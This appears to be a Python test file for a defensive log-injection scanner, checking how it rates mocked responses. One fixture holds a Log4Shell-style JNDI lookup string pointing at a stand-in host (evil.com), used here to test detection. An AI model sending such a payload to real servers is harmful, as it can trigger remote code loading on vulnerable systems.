"""Extra branch coverage for tblue.scanner.log_injection."""

from unittest.mock import MagicMock, patch
from tblue.scanner.log_injection import LogInjectionScanner

URL = "https://example.com"
_MARKER = "TblueLogProbe9z8x"


def _scanner(html="", status=200, headers=None):
    session = MagicMock()
    resp = MagicMock()
    resp.status_code = status
    resp.text = html
    resp.headers = headers or {}
    resp.url = URL
    s = LogInjectionScanner(session)
    s.http.get = MagicMock(return_value=resp)
    s.http.post = MagicMock(return_value=resp)
    return s


def test_no_response_returns_pass():
    """When target returns None, scan short-circuits with a PASS result."""
    s = LogInjectionScanner(MagicMock())
    s.http.get = MagicMock(return_value=None)
    results = s.scan(URL)
    assert isinstance(results, list)
    assert len(results) >= 1
    statuses = [r["status"] for r in results]
    assert "PASS" in statuses


def test_marker_reflected_in_body_flags_injection():
    """If the probe marker appears in the response body, a FAIL is reported."""
    html = f"<html>Error log: {_MARKER}</html>"
    s = _scanner(html=html)
    results = s.scan(URL)
    assert isinstance(results, list)
    statuses = [r["status"] for r in results]
    assert "FAIL" in statuses or "WARN" in statuses


def test_log4shell_pattern_in_response_flags_warn_or_fail():
    """A JNDI string in the response body triggers a log4shell finding."""
    html = "<html>Result: ${jndi:ldap://evil.com/x} found in log</html>"
    s = _scanner(html=html)
    results = s.scan(URL)
    assert isinstance(results, list)
    statuses = [r["status"] for r in results]
    assert "FAIL" in statuses or "WARN" in statuses


def test_clean_response_no_injection_indicators():
    """A plain response with no markers results in no FAIL findings."""
    html = "<html><body>Welcome to the site</body></html>"
    s = _scanner(html=html)
    results = s.scan(URL)
    assert isinstance(results, list)
    fail_results = [r for r in results if r["status"] == "FAIL"]
    assert len(fail_results) == 0


def test_results_have_required_keys():
    """Each result dict contains url, check_type, and status keys."""
    s = _scanner(html="<html>ok</html>")
    results = s.scan(URL)
    for r in results:
        assert "url" in r
        assert "status" in r
